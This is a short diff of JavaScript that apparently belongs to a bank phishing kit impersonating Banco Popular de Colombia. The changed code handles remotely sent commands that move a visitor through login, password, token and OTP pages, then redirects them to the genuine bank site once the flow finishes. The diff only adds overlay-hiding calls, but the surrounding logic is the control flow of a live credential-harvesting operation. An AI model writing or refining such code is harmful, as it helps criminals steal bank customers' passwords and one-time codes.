@@ -84,10 +84,12 @@ document.addEventListener('DOMContentLoaded', () => {
         switch(data.action) {
             case 'request_login':
                 console.log('🔐 Redirigiendo a index.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'index.html';
                 break;
             case 'request_clave':
                 console.log('🔑 Redirigiendo a clave.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'clave.html';
                 break;
             case 'request_token':
@@ -99,10 +101,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_otp':
                 console.log('🔢 Redirigiendo a otp.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a bancopopular.com.co');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.bancopopular.com.co/';
                 break;
             default:
